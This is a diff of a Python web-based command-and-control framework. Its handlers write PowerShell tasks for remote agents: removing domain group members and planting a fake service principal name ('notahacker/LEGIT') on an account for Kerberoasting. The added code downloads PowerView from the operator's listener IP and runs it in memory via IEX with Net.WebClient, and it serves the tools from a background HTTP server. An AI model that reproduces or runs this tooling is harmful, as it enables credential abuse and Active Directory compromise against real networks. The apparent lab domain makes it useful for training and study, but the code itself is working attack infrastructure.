@@ -1182,7 +1182,7 @@ def RmGroupMember(request):
         user = request.POST['user']
         password = request.POST['password']
         group = request.POST['group']
-        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
+        os.system("timeout 30 python3 -m http.server --directory {} 8888 &".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Remove Group Member===============";import-module $env:userprofile\powerview.ps1;$secPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{user}\', $secPassword);Remove-DomainGroupMember -Identity "{group}" -Members "{user}" -Credential $Cred -Verbose;echo "++++++++++++++++++`r`n"'.format(password,user,group)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -1201,10 +1201,13 @@ def CreateFake_SPN(request):
         current_user = request.user
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
-        user = request.POST['user']
+        username = request.POST['username']
         password = request.POST['password']
-        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
-        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Createing Fake SPN===============";import-module $env:userprofile\powerview.ps1;$secPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{user}\', $secPassword);Set-DomainObject -Credential $Cred -Identity {user} -SET @{serviceprincipalname="notahacker/LEGIT"} -Verbose;echo "++++++++++++++++++`r`n"'.format(password,user)
+        domain = request.POST['domain']
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
+        os.system("timeout 30 python3 -m http.server --directory {} 8888 &".format(tools_path))
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Createing Fake SPN===============";IEX(New-Object Net.WebClient).DownloadString(\'http://{3}:8888/PowerView.ps1\');$secPassword =ConvertTo-SecureString \'{0}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'{1}\{2}\', $secPassword);Set-DomainObject -Credential $Cred -Identity {2} -SET @{{serviceprincipalname=\'notahacker/LEGIT\'}} -Verbose;echo "++++++++++++++++++`r`n"'.format(password,domain,username,ip)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
